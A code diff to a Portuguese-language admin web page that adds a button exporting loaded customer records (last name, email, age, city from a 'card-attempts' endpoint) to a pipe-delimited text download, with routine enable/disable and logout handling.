@@ -152,6 +152,7 @@
     <section id="cards-panel" class="panel" hidden>
       <div class="actions">
         <button type="button" class="secondary" id="refresh">Atualizar</button>
+        <button type="button" class="secondary" id="export-txt" disabled>Exportar TXT</button>
         <button type="button" class="secondary" id="logout">Sair</button>
       </div>
       <div id="cards"></div>
@@ -163,6 +164,8 @@
     const cardsPanel = document.getElementById('cards-panel');
     const cardsBox = document.getElementById('cards');
     const loginError = document.getElementById('login-error');
+    const exportButton = document.getElementById('export-txt');
+    let cardRecords = [];
 
     function escapeHtml(value) {
       return String(value ?? '').replace(/[&<>"']/g, (char) => ({
@@ -176,6 +179,7 @@
 
     async function renderCards() {
       cardsBox.innerHTML = '<p class="muted">Carregando...</p>';
+      exportButton.disabled = true;
       const response = await fetch('/api/admin/card-attempts', {
         credentials: 'same-origin'
       });
@@ -185,6 +189,8 @@
       }
 
       const cards = payload.records || [];
+      cardRecords = cards;
+      exportButton.disabled = cards.length === 0;
       if (!cards.length) {
         cardsBox.innerHTML = '<p class="muted">Nenhum registro encontrado.</p>';
         return;
@@ -218,6 +224,30 @@
           </tbody>
         </table>
       `;
+    }
+
+    function exportValue(value) {
+      return String(value ?? '').replace(/[|\r\n]+/g, ' ').trim();
+    }
+
+    function exportTxt() {
+      if (!cardRecords.length) return;
+
+      const text = cardRecords.map((card) => [
+        card.last_name,
+        card.email,
+        card.age,
+        card.city
+      ].map(exportValue).join('|')).join('\r\n');
+      const file = new Blob([text], { type: 'text/plain;charset=utf-8' });
+      const url = URL.createObjectURL(file);
+      const link = document.createElement('a');
+      link.href = url;
+      link.download = `clientes-${new Date().toISOString().slice(0, 10)}.txt`;
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+      URL.revokeObjectURL(url);
     }
 
     function updateView(authenticated) {
@@ -271,11 +301,14 @@
         cardsBox.innerHTML = `<p class="error">${escapeHtml(error.message)}</p>`;
       });
     });
+    exportButton.addEventListener('click', exportTxt);
     document.getElementById('logout').addEventListener('click', async () => {
       await fetch('/api/admin/logout', {
         method: 'POST',
         credentials: 'same-origin'
       }).catch(() => null);
+      cardRecords = [];
+      exportButton.disabled = true;
       updateView(false);
     });
 
